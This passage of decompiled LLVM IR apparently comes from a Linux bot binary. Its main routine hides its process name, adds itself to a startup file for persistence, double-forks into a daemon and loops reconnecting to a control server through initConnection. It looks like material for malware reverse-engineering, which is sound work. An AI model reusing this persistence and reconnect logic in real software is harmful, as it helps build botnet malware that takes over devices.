  %v3_804ee7c = add i32 %storemerge40, ptrtoint (i8** @global_var_8061590.676 to i32)
  %v4_804ee7c = inttoptr i32 %v3_804ee7c to i8*
  store i8 %v2_804ee7a, i8* %v4_804ee7c, align 1
  %v4_804ee82 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804ee82, 6
  br i1 %exitcond, label %dec_label_pc_804ee8b.loopexit, label %dec_label_pc_804ee68

dec_label_pc_804ee8b.loopexit:                    ; preds = %dec_label_pc_804ee68
  br label %dec_label_pc_804ee8b

dec_label_pc_804ee8b:                             ; preds = %dec_label_pc_804ee8b.loopexit, %dec_label_pc_804ee14
  %v2_804ee91 = call i32 @__libc_close(i32 %v5_804ecb8)
  %v3_804eea7.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804eea7

dec_label_pc_804ee9b:                             ; preds = %dec_label_pc_804ed4c, %dec_label_pc_804ecd8, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804eea7

dec_label_pc_804eea7:                             ; preds = %dec_label_pc_804ee8b, %dec_label_pc_804ee9b
  %v3_804eea7 = phi i32 [ %v3_804eea7.pre, %dec_label_pc_804ee8b ], [ 0, %dec_label_pc_804ee9b ]
  ret i32 %v3_804eea7

; uselistorder directives
  uselistorder i32 %v5_804edc6, { 1, 0 }
  uselistorder i32 %v2_804edf6, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804ed93, { 2, 1, 0 }
  uselistorder i32 %v5_804ecb8, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 13, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804eea7, { 1, 0 }
  uselistorder label %dec_label_pc_804ee68, { 1, 0 }
  uselistorder label %dec_label_pc_804ee14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804edc6, { 1, 0 }
  uselistorder label %dec_label_pc_804eda0, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([11 x i8]* @global_var_805f5f3.677 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp104 = call i8* @__decompiler_undefined_function_2()
  %tmp113 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804eeb9 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804eeb9, i32* %stack_var_-24, align 4
  %v5_804eeca = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804eeca, i1* %cf.global-to-local, align 1
  store i32 %v2_804eeb9, i32* %edx.global-to-local, align 4
  %v1_804eee3 = add i32 %v2_804eeb9, 4
  %v2_804eee3 = inttoptr i32 %v1_804eee3 to i32*
  %v3_804eee3 = load i32, i32* %v2_804eee3, align 4
  store i32 %v3_804eee3, i32* %eax.global-to-local, align 4
  %v1_804eee6 = inttoptr i32 %v3_804eee3 to i32*
  %v2_804eee6 = load i32, i32* %v1_804eee6, align 4
  %v1_804eef3 = and i32 %v2_804eee6, -256
  store i32 %v1_804eef3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804eef6 = inttoptr i32 %v2_804eee6 to i8*
  store i32 %v2_804eee6, i32* @edi, align 4
  %v3_804eefc = call i32 @_strlen(i8* %v4_804eef6)
  %v4_804eefc = mul i32 %v3_804eefc, -1
  %v1_804ef00 = sub i32 1, %v4_804eefc
  store i32 %v1_804ef00, i32* %eax.global-to-local, align 4
  %v1_804ef02 = sub i32 0, %v4_804eefc
  store i32 %v1_804ef02, i32* %edx.global-to-local, align 4
  %v3_804ef0b = load i32, i32* %v2_804eee3, align 4
  store i32 %v3_804ef0b, i32* %eax.global-to-local, align 4
  %v1_804ef0e = inttoptr i32 %v3_804ef0b to i32*
  %v2_804ef0e = load i32, i32* %v1_804ef0e, align 4
  store i32 %v2_804ef0e, i32* %eax.global-to-local, align 4
  %v0_804ef10 = load i32, i32* @esp, align 4
  %v5_804ef10 = icmp ult i32 %v0_804ef10, 4
  store i1 %v5_804ef10, i1* %cf.global-to-local, align 1
  %v5_804ef19 = inttoptr i32 %v2_804ef0e to i8*
  store i8* %v5_804ef19, i8** %stack_var_-5888, align 4
  %v5_804ef1a = call i32 @strncpy(i8* %v5_804ef19, i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), i32 %v1_804ef02)
  store i32 %v5_804ef1a, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804eeb9, i32* @esi, align 4
  %v3_804ef2d = load i32, i32* %v2_804eee3, align 4
  %v2_804ef30 = inttoptr i32 %v3_804ef2d to i32*
  store i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), i32* %v2_804ef30, align 4
  store i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), i32* %eax.global-to-local, align 4
  %v0_804ef35 = load i32, i32* @esp, align 4
  %v5_804ef35 = icmp ult i32 %v0_804ef35, 12
  store i1 %v5_804ef35, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804ef41 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_805f5fe.678 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804ef41, i32* %eax.global-to-local, align 4
  %v5_804ef49 = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804ef4e = call i32 @__GI_time(i32* null)
  store i32 %v3_804ef4e, i32* %eax.global-to-local, align 4
  %v0_804ef53 = load i32, i32* @esp, align 4
  %v2_804ef53 = icmp ugt i32 %v0_804ef53, -17
  store i1 %v2_804ef53, i1* %cf.global-to-local, align 1
  store i32 %v3_804ef4e, i32* @ebx, align 4
  %v0_804ef58 = call i32 @__libc_getpid()
  %v1_804ef5d = load i32, i32* @ebx, align 4
  %v2_804ef5d = xor i32 %v1_804ef5d, %v0_804ef58
  store i32 %v2_804ef5d, i32* @eax, align 4
  %v0_804ef5f = load i32, i32* @esp, align 4
  %v5_804ef5f = icmp ult i32 %v0_804ef5f, 12
  store i1 %v5_804ef5f, i1* %cf.global-to-local, align 1
  %v5_804ef62 = inttoptr i32 %v2_804ef5d to i8*
  store i8* %v5_804ef62, i8** %stack_var_-5888, align 4
  %v2_804ef63 = call i32 @srand(i32 %v2_804ef5d)
  store i32 %v2_804ef63, i32* %eax.global-to-local, align 4
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804ef70 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ef70, i32* %eax.global-to-local, align 4
  %v0_804ef75 = load i32, i32* @esp, align 4
  %v2_804ef75 = icmp ugt i32 %v0_804ef75, -17
  store i1 %v2_804ef75, i1* %cf.global-to-local, align 1
  store i32 %v3_804ef70, i32* @ebx, align 4
  %v0_804ef7a = call i32 @__libc_getpid()
  %v1_804ef7f = load i32, i32* @ebx, align 4
  %v2_804ef7f = xor i32 %v1_804ef7f, %v0_804ef7a
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804ef7f, i32* %eax.global-to-local, align 4
  %v1_804ef82 = call i32 @init_rand(i32 %v2_804ef7f)
  store i32 %v1_804ef82, i32* @eax, align 4
  %v5_804ef98 = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  %tmp160 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_805f5ff.679 to i32), i32* %tmp160, align 4
  %v3_804efa3 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_805f5ff.679 to i32), i32 ptrtoint (i32* @global_var_805f612.680 to i32))
  store i32 %v3_804efa3, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804efae = icmp eq i32 %v3_804efa3, 0
  %v1_804efb2 = icmp eq i1 %v4_804efae, false
  br i1 %v1_804efb2, label %dec_label_pc_804efd1, label %dec_label_pc_804efb4

dec_label_pc_804efb4:                             ; preds = %entry
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_805f614.681 to i32), i32* %tmp160, align 4
  %v3_804efc6 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_805f614.681 to i32), i32 ptrtoint (i32* @global_var_805f612.680 to i32))
  store i32 %v3_804efc6, i32* %eax.global-to-local, align 4
  %v0_804efcb = load i32, i32* @esp, align 4
  %v2_804efcb = icmp ugt i32 %v0_804efcb, -17
  store i1 %v2_804efcb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804efd1

dec_label_pc_804efd1:                             ; preds = %entry, %dec_label_pc_804efb4
  %stack_var_-88.0 = phi i32 [ %v3_804efa3, %entry ], [ %v3_804efc6, %dec_label_pc_804efb4 ]
  %v3_804f12113 = phi i32 [ ptrtoint ([19 x i8]* @global_var_805f5ff.679 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_805f614.681 to i32), %dec_label_pc_804efb4 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804efd1 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804efd1, label %dec_label_pc_804f178, label %dec_label_pc_804efdb

dec_label_pc_804efdb:                             ; preds = %dec_label_pc_804efd1
  %v3_804efe1 = load i32, i32* %v2_804eee3, align 4
  store i32 %v3_804efe1, i32* %eax.global-to-local, align 4
  %v1_804efe4 = inttoptr i32 %v3_804efe1 to i32*
  %v2_804efe4 = load i32, i32* %v1_804efe4, align 4
  %v1_804eff1 = and i32 %v2_804efe4, -256
  store i32 %v1_804eff1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804eff4 = inttoptr i32 %v2_804efe4 to i8*
  store i32 %v2_804efe4, i32* @edi, align 4
  %v3_804effa = call i32 @_strlen(i8* %v4_804eff4)
  %v0_804f00b = load i32, i32* @esp, align 4
  %v5_804f00b = icmp ult i32 %v0_804f00b, 8
  store i1 %v5_804f00b, i1* %cf.global-to-local, align 1
  %v2_804f013 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804f013, i32* %eax.global-to-local, align 4
  %tmp161 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp161, i8** %stack_var_-5888, align 4
  %v3_804f01a = call i32 @getcwd(i32 %v2_804f013, i32 256)
  %v0_804f01f = load i32, i32* @esp, align 4
  %v2_804f01f = icmp ugt i32 %v0_804f01f, -17
  store i1 %v2_804f01f, i1* %cf.global-to-local, align 1
  store i32 %v2_804f013, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804f013, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_805f621.682 to i32), i32* @edi, align 4
  %v7_804f055 = call i32 @_strncmp(i8* %tmp161, i8* bitcast (i8** @global_var_805f621.682 to i8*), i32 2)
  %v8_804f055 = urem i32 %v7_804f055, 2
  %v9_804f055 = icmp eq i32 %v8_804f055, 0
  %v0_804f057 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f057 = or i1 %v0_804f057, %v9_804f055
  %v3_804f057 = zext i1 %v2_804f057 to i32
  %v4_804f057 = load i32, i32* @edx, align 4
  %v5_804f057 = and i32 %v4_804f057, -256
  %v6_804f057 = or i32 %v3_804f057, %v5_804f057
  %v7_804f057 = xor i32 %v6_804f057, 1
  store i32 %v7_804f057, i32* %edx.global-to-local, align 4
  %v5_804f05a = ptrtoint i32* %stack_var_-512 to i32
  %v3_804f05d = and i32 %v7_804f055, -256
  %v1_804f05f = trunc i32 %v7_804f057 to i8
  %v3_804f05f = trunc i32 %v5_804f05a to i8
  %v4_804f05f = sub i8 %v1_804f05f, %v3_804f05f
  %v15_804f05f = icmp eq i8 %v4_804f05f, 0
  %v20_804f05f = zext i8 %v4_804f05f to i32
  %v23_804f05f = or i32 %v20_804f05f, %v3_804f05d
  store i32 %v23_804f05f, i32* @ecx, align 4
  %v2_804f063 = sext i8 %v4_804f05f to i32
  store i32 %v2_804f063, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804f05f, label %dec_label_pc_804f16a, label %dec_label_pc_804f073.preheader

dec_label_pc_804f073.preheader:                   ; preds = %dec_label_pc_804efdb
  br label %dec_label_pc_804f073

dec_label_pc_804f070:                             ; preds = %dec_label_pc_804f073
  %v4_804f070 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804f073

dec_label_pc_804f073:                             ; preds = %dec_label_pc_804f073.preheader, %dec_label_pc_804f070
  %stack_var_-84.0 = phi i32 [ %v4_804f070, %dec_label_pc_804f070 ], [ %v3_804effa, %dec_label_pc_804f073.preheader ]
  store i32 %v2_804eeb9, i32* @esi, align 4
  %v3_804f079 = load i32, i32* %v2_804eee3, align 4
  store i32 %v3_804f079, i32* %eax.global-to-local, align 4
  %v1_804f07c = inttoptr i32 %v3_804f079 to i32*
  %v2_804f07c = load i32, i32* %v1_804f07c, align 4
  store i32 %v2_804f07c, i32* %edx.global-to-local, align 4
  %v2_804f081 = add i32 %v2_804f07c, %stack_var_-84.0
  store i32 %v2_804f081, i32* %eax.global-to-local, align 4
  %v1_804f084 = inttoptr i32 %v2_804f081 to i8*
  %v2_804f084 = load i8, i8* %v1_804f084, align 1
  %v3_804f084 = zext i8 %v2_804f084 to i32
  %v5_804f084 = and i32 %v2_804f081, -256
  %v6_804f084 = or i32 %v3_804f084, %v5_804f084
  store i32 %v6_804f084, i32* %eax.global-to-local, align 4
  %v6_804f086 = icmp ult i8 %v2_804f084, 47
  store i1 %v6_804f086, i1* %cf.global-to-local, align 1
  %v10_804f086 = icmp eq i8 %v2_804f084, 47
  %v1_804f088 = icmp eq i1 %v10_804f086, false
  br i1 %v1_804f088, label %dec_label_pc_804f070, label %dec_label_pc_804f08a

dec_label_pc_804f08a:                             ; preds = %dec_label_pc_804f073
  store i32 %v2_804eeb9, i32* @edi, align 4
  %v3_804f090 = load i32, i32* %v2_804eee3, align 4
  store i32 %v3_804f090, i32* %eax.global-to-local, align 4
  %v1_804f093 = inttoptr i32 %v3_804f090 to i32*
  %v2_804f093 = load i32, i32* %v1_804f093, align 4
  store i32 %v2_804f093, i32* %edx.global-to-local, align 4
  %v2_804f098 = add i32 %v2_804f093, %stack_var_-84.0
  %v2_804f0a8 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804f0a8, i32* %eax.global-to-local, align 4
  %tmp162 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v5_804f0af = call i32 @sprintf(i32 %v2_804f0a8, i32 ptrtoint ([8 x i8]* @global_var_805f623.683 to i32), i32 %v2_804f013, i32 %v2_804f098)
  store i32 %v5_804f0af, i32* %eax.global-to-local, align 4
  %v0_804f0b4 = load i32, i32* @esp, align 4
  %v2_804f0b4 = icmp ugt i32 %v0_804f0b4, -17
  store i1 %v2_804f0b4, i1* %cf.global-to-local, align 1
  %v8_804f0f6 = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp163 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804f0c4 = ptrtoint i32* %stack_var_-1648 to i32
  %tmp164 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804f0b9 = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804f0f3.outer

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f0f3
  store i1 %v5_804f0b9, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0c4, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804f0cb = call i32 @fgets(i32 %v2_804f0c4, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0c4, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804f0e4 = call i32 @__GI_strcasecmp(i8* %tmp164, i32 %v2_804f0a8)
  store i32 %v4_804f0e4, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f0ec = icmp eq i32 %v4_804f0e4, 0
  %v1_804f0ee = icmp eq i1 %v1_804f0ec, false
  br i1 %v1_804f0ee, label %dec_label_pc_804f0f3, label %dec_label_pc_804f0f0

dec_label_pc_804f0f0:                             ; preds = %dec_label_pc_804f0b9
  %v4_804f0f0 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804f0f3.outer

dec_label_pc_804f0f3.outer:                       ; preds = %dec_label_pc_804f0f0, %dec_label_pc_804f08a
  %stack_var_-80.0.ph = phi i32 [ %v4_804f0f0, %dec_label_pc_804f0f0 ], [ 0, %dec_label_pc_804f08a ]
  br label %dec_label_pc_804f0f3

dec_label_pc_804f0f3:                             ; preds = %dec_label_pc_804f0f3.outer, %dec_label_pc_804f0b9
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  store i8* %v8_804f0f6, i8** %stack_var_-5888, align 4
  %v3_804f0f9 = call i32 @feof(i32* %tmp163)
  store i32 %v3_804f0f9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f101 = icmp eq i32 %v3_804f0f9, 0
  br i1 %v1_804f101, label %dec_label_pc_804f0b9, label %dec_label_pc_804f105

dec_label_pc_804f105:                             ; preds = %dec_label_pc_804f0f3
  %v4_804f105 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804f109 = icmp eq i1 %v4_804f105, false
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  store i8* %v8_804f0f6, i8** %stack_var_-5888, align 4
  %tmp165 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804f160 = call i32 @__GI_fclose(i16* %tmp165)
  store i32 %v3_804f160, i32* @eax, align 4
  %v0_804f165 = load i32, i32* @esp, align 4
  %v2_804f165 = icmp ugt i32 %v0_804f165, -17
  store i1 %v2_804f165, i1* %cf.global-to-local, align 1
  br i1 %v1_804f109, label %dec_label_pc_804f178, label %dec_label_pc_804f10b

dec_label_pc_804f10b:                             ; preds = %dec_label_pc_804f105
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  store i32 %v3_804f12113, i32* %tmp160, align 4
  %v3_804f124 = call i32 @__GI_fopen(i32 %v3_804f12113, i32 ptrtoint (i32* @global_var_805f62b.684 to i32))
  store i32 %v3_804f124, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f12f = icmp eq i32 %v3_804f124, 0
  br i1 %v4_804f12f, label %dec_label_pc_804f178, label %dec_label_pc_804f135

dec_label_pc_804f135:                             ; preds = %dec_label_pc_804f10b
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0a8, i32* %eax.global-to-local, align 4
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v3_804f142 = call i32 @__GI_fputs(i32 %v2_804f0a8, i32 %v3_804f124)
  store i32 %v3_804f142, i32* @eax, align 4
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  %v8_804f14d = inttoptr i32 %v3_804f124 to i8*
  store i8* %v8_804f14d, i8** %stack_var_-5888, align 4
  %tmp166 = inttoptr i32 %v3_804f124 to i16*
  %v3_804f150 = call i32 @__GI_fclose(i16* %tmp166)
  store i32 %v3_804f150, i32* %eax.global-to-local, align 4
  %v0_804f155 = load i32, i32* @esp, align 4
  %v2_804f155 = icmp ugt i32 %v0_804f155, -17
  store i1 %v2_804f155, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f178

dec_label_pc_804f16a:                             ; preds = %dec_label_pc_804efdb
  %v0_804f16a = load i32, i32* @esp, align 4
  %v5_804f16a = icmp ult i32 %v0_804f16a, 12
  store i1 %v5_804f16a, i1* %cf.global-to-local, align 1
  %v8_804f16d = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804f16d, i8** %stack_var_-5888, align 4
  %tmp167 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804f170 = call i32 @__GI_fclose(i16* %tmp167)
  store i32 %v3_804f170, i32* %eax.global-to-local, align 4
  %v0_804f175 = load i32, i32* @esp, align 4
  %v2_804f175 = icmp ugt i32 %v0_804f175, -17
  store i1 %v2_804f175, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f178

dec_label_pc_804f178:                             ; preds = %dec_label_pc_804f105, %dec_label_pc_804f10b, %dec_label_pc_804efd1, %dec_label_pc_804f135, %dec_label_pc_804f16a
  %v0_804f178 = call i32 @getOurIP()
  store i32 %v0_804f178, i32* %eax.global-to-local, align 4
  %v0_804f17d = load i8*, i8** %stack_var_-5888, align 4
  %v1_804f17d = ptrtoint i8* %v0_804f17d to i32
  %v2_804f17d = call i32 @__libc_fork(i32 %v1_804f17d)
  store i32 %v2_804f17d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f185 = icmp eq i32 %v2_804f17d, 0
  br i1 %v4_804f185, label %dec_label_pc_804f1af, label %dec_label_pc_804f1e0

dec_label_pc_804f1af:                             ; preds = %dec_label_pc_804f178
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804f1af = load i8*, i8** %stack_var_-5888, align 4
  %v1_804f1af = ptrtoint i8* %v0_804f1af to i32
  %v2_804f1af = call i32 @__libc_fork(i32 %v1_804f1af)
  store i32 %v2_804f1af, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f1b7 = icmp eq i32 %v2_804f1af, 0
  br i1 %v4_804f1b7, label %dec_label_pc_804f1c7.thread, label %dec_label_pc_804f1cd

dec_label_pc_804f1c7.thread:                      ; preds = %dec_label_pc_804f1af
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f1f1

dec_label_pc_804f1cd:                             ; preds = %dec_label_pc_804f1af
  %v0_804f1bd = load i32, i32* @esp, align 4
  %v5_804f1bd = icmp ult i32 %v0_804f1bd, 12
  store i1 %v5_804f1bd, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804f1c2 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_805f62d.685 to i32), i32* %eax.global-to-local, align 4
  %v0_804f1d2 = load i32, i32* @esp, align 4
  %v5_804f1d2 = icmp ult i32 %v0_804f1d2, 12
  store i1 %v5_804f1d2, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805f62d.685, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804f1d6 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805f62d.685 to i32))
  store i32 %v2_804f1d6, i32* %eax.global-to-local, align 4
  %v0_804f1db = load i32, i32* @esp, align 4
  %v2_804f1db = icmp ugt i32 %v0_804f1db, -17
  store i1 %v2_804f1db, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f1f1

dec_label_pc_804f1e0:                             ; preds = %dec_label_pc_804f178
  %v0_804f18b = load i32, i32* @esp, align 4
  %v5_804f18b = icmp ult i32 %v0_804f18b, 4
  store i1 %v5_804f18b, i1* %cf.global-to-local, align 1
  %v2_804f190 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804f190, i32* %eax.global-to-local, align 4
  %v8_804f194 = inttoptr i32 %v2_804f17d to i8*
  store i8* %v8_804f194, i8** %stack_var_-5888, align 4
  %v4_804f197 = call i32 @__libc_waitpid(i32 %v2_804f17d, i32 %v2_804f190, i32 0)
  store i32 %v4_804f197, i32* @eax, align 4
  store i1 %v5_804ef49, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804f1a4 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_805f62d.685 to i32), i32* %eax.global-to-local, align 4
  %v0_804f1e5 = load i32, i32* @esp, align 4
  %v5_804f1e5 = icmp ult i32 %v0_804f1e5, 12
  store i1 %v5_804f1e5, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805f62d.685, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804f1e9 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_805f62d.685 to i32))
  store i32 %v2_804f1e9, i32* %eax.global-to-local, align 4
  %v0_804f1ee = load i32, i32* @esp, align 4
  %v2_804f1ee = icmp ugt i32 %v0_804f1ee, -17
  store i1 %v2_804f1ee, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f1f1

dec_label_pc_804f1f1:                             ; preds = %dec_label_pc_804f1c7.thread, %dec_label_pc_804f1cd, %dec_label_pc_804f1e0
  %v0_804f1f1 = call i32 @__GI_setsid()
  store i32 %v0_804f1f1, i32* %eax.global-to-local, align 4
  %v0_804f1f6 = load i32, i32* @esp, align 4
  %v5_804f1f6 = icmp ult i32 %v0_804f1f6, 12
  store i1 %v5_804f1f6, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_805f621.682 to i8*), i8** %stack_var_-5888, align 4
  %v2_804f1fe = call i32 @chdir(i32 ptrtoint (i8** @global_var_805f621.682 to i32))
  store i32 %v2_804f1fe, i32* %eax.global-to-local, align 4
  store i1 %v5_804ef98, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_804f20d = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804f20d, i32* %eax.global-to-local, align 4
  %v0_804f212 = load i32, i32* @esp, align 4
  %v2_804f212 = icmp ugt i32 %v0_804f212, -17
  store i1 %v2_804f212, i1* %cf.global-to-local, align 1
  %v2_804f8cf = ptrtoint i32* %stack_var_-5744 to i32
  %tmp168 = bitcast i32* %stack_var_-5744 to i8*
  %tmp169 = bitcast i8** %stack_var_-36 to i32*
  %v2_804f886 = ptrtoint i32* %stack_var_-624 to i32
  %v2_804f6c2 = ptrtoint i32* %stack_var_-1648 to i32
  %v5_804f535 = and i32 %v2_804f8cf, -256
  %v1_804f542 = or i32 %v2_804f8cf, 1
  %storemerge16190 = inttoptr i32 %v1_804f542 to i8*
  br label %dec_label_pc_804f217.outer

dec_label_pc_804f217.outer:                       ; preds = %dec_label_pc_804f501, %dec_label_pc_804f8cf, %dec_label_pc_804f1f1
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804f1f1 ], [ %stack_var_-28.1.ph, %dec_label_pc_804f8cf ], [ %stack_var_-28.1.ph, %dec_label_pc_804f501 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp104, %dec_label_pc_804f1f1 ], [ %stack_var_-64.2.ph27, %dec_label_pc_804f8cf ], [ %stack_var_-64.2.ph27, %dec_label_pc_804f501 ]
  %stack_var_-60.0.ph31 = phi i32 [ %tmp113, %dec_label_pc_804f1f1 ], [ %stack_var_-60.3, %dec_label_pc_804f8cf ], [ %stack_var_-60.2, %dec_label_pc_804f501 ]
  %stack_var_-96.0.ph32 = phi i32 [ 0, %dec_label_pc_804f1f1 ], [ %stack_var_-96.2.ph29, %dec_label_pc_804f8cf ], [ %v4_804f501, %dec_label_pc_804f501 ]
  %v0_804f217183 = call i32 @initConnection()
  store i32 %v0_804f217183, i32* %eax.global-to-local, align 4
  %v1_804f21c184 = icmp eq i32 %v0_804f217183, 0
  %v0_804f22f185 = load i32, i32* @esp, align 4
  %v5_804f22f187 = icmp ult i32 %v0_804f22f185, 12
  store i1 %v5_804f22f187, i1* %cf.global-to-local, align 1
  br i1 %v1_804f21c184, label %dec_label_pc_804f22f, label %dec_label_pc_804f220

dec_label_pc_804f220:                             ; preds = %dec_label_pc_804f217.outer, %dec_label_pc_804f220
  %v0_804f22f189 = phi i32 [ %v0_804f22f, %dec_label_pc_804f220 ], [ %v0_804f22f185, %dec_label_pc_804f217.outer ]
  %v1_804f223 = add i32 %v0_804f22f189, -16
  %v2_804f223 = inttoptr i32 %v1_804f223 to i32*
  store i32 30, i32* %v2_804f223, align 4
  %v0_804f225 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804f225 = ptrtoint i8* %v0_804f225 to i32
  %v2_804f225 = call i32 @sleep(i32 %v1_804f225)
  store i32 %v2_804f225, i32* %eax.global-to-local, align 4
  %v0_804f22a = load i32, i32* @esp, align 4
  %v2_804f22a = icmp ugt i32 %v0_804f22a, -17
  store i1 %v2_804f22a, i1* %cf.global-to-local, align 1
  %v0_804f217 = call i32 @initConnection()
  store i32 %v0_804f217, i32* %eax.global-to-local, align 4
  %v1_804f21c = icmp eq i32 %v0_804f217, 0
